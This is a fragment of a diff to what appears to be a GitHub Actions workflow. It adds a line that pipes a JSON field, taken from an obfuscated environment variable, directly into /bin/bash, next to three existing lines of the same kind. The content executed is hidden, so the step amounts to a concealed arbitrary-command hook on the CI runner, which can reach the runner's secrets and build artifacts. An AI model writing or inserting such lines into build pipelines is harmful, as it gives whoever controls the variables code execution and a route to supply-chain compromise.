@@ -25,6 +25,7 @@ jobs:
           echo $ifte8 | jq -r .c3748 | /bin/bash
           printf '%s' "$anc97231" | jq -r .xljmk1805 | /bin/bash
           printf '%s' "$xc81882" | jq -r .oa634 | /bin/bash
+          printf '%s' "$j6" | jq -r .jycvd017 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
